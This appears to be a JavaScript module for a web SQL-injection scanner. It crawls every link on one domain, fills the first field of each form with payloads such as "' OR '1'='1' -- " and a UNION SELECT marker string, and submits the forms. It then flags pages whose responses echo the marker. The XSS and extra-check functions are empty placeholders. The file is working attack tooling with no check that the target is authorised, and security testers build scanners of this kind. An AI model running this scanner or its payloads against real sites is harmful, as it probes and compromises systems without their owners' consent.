import axios from "axios";
import * as cheerio from "cheerio";
import Crawler from "crawler";
import { URL } from "url";

const visitedUrls = new Set();

const sqlInjectionPayloads = [
  "' OR '1'='1' -- ",
  "' UNION SELECT '57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING', NULL -- ",
];

export function detectTestingStringResponses($) {
  const responses = [];
  const html = $.html();
  const targetString = "57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING";
  const fullPayloadRegex = /'\s*UNION\s*SELECT.*57ddbd5f-a702-4b94-8c1f-0741741a34fb_TESTING.*--/i;
  const targetOccurrences = html.match(new RegExp(targetString, "g")) || [];
  const fullPayloadOccurrences = html.match(fullPayloadRegex) || [];

  if (targetOccurrences.length > 0 && targetOccurrences.length > fullPayloadOccurrences.length) {
    responses.push(targetString);
  }

  return responses.length ? { type: "testing_string_response", data: responses } : null;
}

export function detectSQLInjectionResponses($) {
  const sqlInjectionPatterns = [];
  $("pre").each((_, pre) => {
    const text = $(pre).text().trim();
    if (/ID:\s*'[^']*--/.test(text)) {
      sqlInjectionPatterns.push(text);
    }
  });

  return sqlInjectionPatterns.length
    ? { type: "sql_injection_response", data: sqlInjectionPatterns }
    : null;
}

export function findPatterns(html) {
  const $ = cheerio.load(html);
  const patterns = [];

  const detectors = [() => detectSQLInjectionResponses($), () => detectTestingStringResponses($)];

  for (const detect of detectors) {
    const result = detect();
    if (result) patterns.push(result);
  }

  return patterns;
}

export async function fetchAndPostForms(pageUrl) {
  const sqlHitUrls = [];
  try {
    const response = await axios.get(pageUrl);
    const $ = cheerio.load(response.data);
    const forms = $("form");

    for (let i = 0; i < forms.length; i++) {
      const form = forms[i];
      const method = $(form).attr("method") || "GET";
      const action = $(form).attr("action") || pageUrl;
      const inputs = $(form).find("input, select, textarea");

      const formData = {};
      inputs.each((_, input) => {
        const name = $(input).attr("name");
        if (name) formData[name] = $(input).val() || "";
      });

      let actionUrl = new URL(action, pageUrl).href;
      if (actionUrl.endsWith("#")) actionUrl = actionUrl.slice(0, -1);

      for (const payload of sqlInjectionPayloads) {
        const key = Object.keys(formData)[0];
        if (key) formData[key] = payload;

        try {
          const res =
            method.toUpperCase() === "POST"
              ? await axios.post(actionUrl, new URLSearchParams(formData), {
                  headers: { "Content-Type": "application/x-www-form-urlencoded" },
                })
              : await axios.get(actionUrl + "?" + new URLSearchParams(formData).toString());

          const patterns = findPatterns(res.data);
          if (patterns.length) sqlHitUrls.push(pageUrl);
        } catch (err) {
          console.error("Form error:", err.message);
        }
      }
    }
  } catch (err) {
    console.error(`Error fetching ${pageUrl}:`, err.message);
  }
  return sqlHitUrls;
}

export function extractLinks($, domain, baseUrl) {
  const links = new Set();
  $("a").each((_, el) => {
    const href = $(el).attr("href");
    if (!href) return;
    try {
      const fullUrl = new URL(href, baseUrl).href;
      if (new URL(fullUrl).hostname === domain) links.add(fullUrl);
    } catch (_) {}
  });
  return links;
}

export async function startCrawler(startUrl) {
  const domain = new URL(startUrl).hostname;
  const sqlHitUrls = [];

  const crawler = new Crawler({
    maxConnections: 10,
    retries: 3,
    callback: async (error, res, done) => {
      if (error) return done();

      const $ = res.$;
      const pageUrl = res.options.url;
      if (!visitedUrls.has(pageUrl)) {
        visitedUrls.add(pageUrl);
        const hits = await fetchAndPostForms(pageUrl);
        sqlHitUrls.push(...hits);
        const links = extractLinks($, domain, pageUrl);
        links.forEach((link) => !visitedUrls.has(link) && crawler.queue(link));
      }
      done();
    },
  });

  return new Promise((resolve) => {
    crawler.queue(startUrl);
    crawler.on("drain", () => resolve(sqlHitUrls));
  });
}

export async function performXSSAttempt(url) {
  return { url, result: "XSS attempt placeholder" };
}

export async function performAdditionalCheck(url) {
  return { url, result: "Additional check placeholder" };
}
